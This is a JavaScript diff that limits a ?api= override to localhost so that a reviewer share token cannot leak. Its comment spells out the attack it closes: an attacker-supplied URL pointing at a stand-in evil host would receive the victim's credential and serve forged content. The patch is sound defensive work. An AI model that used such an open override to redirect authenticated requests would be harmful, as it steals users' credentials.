@@ -34,8 +34,22 @@
 
   function apiBase() {
     var override = params().get('api');
-    if (override) return String(override).replace(/\/$/, '');
-    return '';
+    // The ?api= override exists for local Playwright tests only.
+    //
+    // It must NEVER be honoured on a public deployment: every request this
+    // page makes carries the reviewer share token in the X-EPI-Share-Token
+    // header, so an attacker-supplied ?api=https://evil.example would
+    // forward the victim's reviewer credential to the attacker (and let the
+    // attacker serve arbitrary content back as the trust page).
+    //
+    // The site's Content-Security-Policy is Report-Only, so nothing else
+    // would stop it (red-team W-01).
+    if (!override) return '';
+    var host = (window.location.hostname || '').toLowerCase();
+    var isLocal = host === 'localhost' || host === '127.0.0.1' || host === '::1' ||
+                  host === '0.0.0.0' || /\.localhost$/.test(host);
+    if (!isLocal) return '';
+    return String(override).replace(/\/$/, '');
   }
 
   var SLUG = slug();
